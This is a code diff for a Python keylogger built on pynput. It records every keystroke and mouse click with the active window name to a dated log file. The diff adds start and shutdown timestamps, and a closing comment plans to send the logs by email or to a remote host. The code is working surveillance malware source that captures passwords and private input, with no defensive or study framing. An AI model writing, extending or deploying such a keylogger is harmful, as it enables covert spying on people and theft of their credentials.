@@ -1,13 +1,26 @@
 from pynput import keyboard, mouse
+from datetime import datetime, date, time
 import ctypes
 import subprocess
 import platform
+
+log_file_name = f"log_{date.today()}.txt"
 
 # ESCAPE KEY USED TO STOP LISTENERS
 STOP_KEY = keyboard.Key.esc
 
 # GLOBAL FLAG WHICH WILL CORRESPOND TO STOPKEY TO CEASE BOTH LISTENERS
 stop_flag = False
+
+def initialize_log_file():
+    with open(log_file_name, 'a', encoding='utf-8') as f:
+        creation_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        f.write(f"File created on {creation_time}\n")
+
+def finalize_log_file():
+    with open(log_file_name, 'a', encoding='utf-8') as f:
+        shutdown_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        f.write(f"Shutdown at {shutdown_time}\n")
 
 def get_active_window_title():
     try:
@@ -45,7 +58,8 @@ def on_key_press(key):
         elif letter == 'Key.tab':
             letter = '<TAB>'
         
-        with open("log.txt", 'a', encoding='utf-8') as f:
+
+        with open(log_file_name, 'a', encoding='utf-8') as f:
             f.write(f"[{app_name}] Key {letter}\n")
         
         if key == STOP_KEY:
@@ -67,12 +81,13 @@ def on_mouse_click(x, y, button, pressed):
         action = 'pressed' if pressed else 'released'
         button_label = button_map.get(button, str(button))
         
-        with open("log.txt", 'a', encoding='utf-8') as f:
+        with open(log_file_name, 'a', encoding='utf-8') as f:
             f.write(f"[{app_name}] Mouse {action} at ({x}, {y}) with {button_label}\n")
     except Exception as e:
         print(f"An error occurred in mouse handler: {e}")
 
 # CREATES KEYBOARD AND MOUSE LISTENERS UNDER PARAMETER DEFINED CONSTRAINTS (on_press/on_click)
+initialize_log_file()
 keyboard_listener = keyboard.Listener(on_press=on_key_press)
 keyboard_listener.start()
 mouse_listener = mouse.Listener(on_click=on_mouse_click)
@@ -83,4 +98,5 @@ keyboard_listener.join() # COMBINES KEYSTROKES RECORDED
 if stop_flag:
     mouse_listener.stop()
 
+finalize_log_file()
 # NEXT STEP IS TO MAKE EMAIL/CONCURRENT COMMUNICATION WITH REMOTE HOST
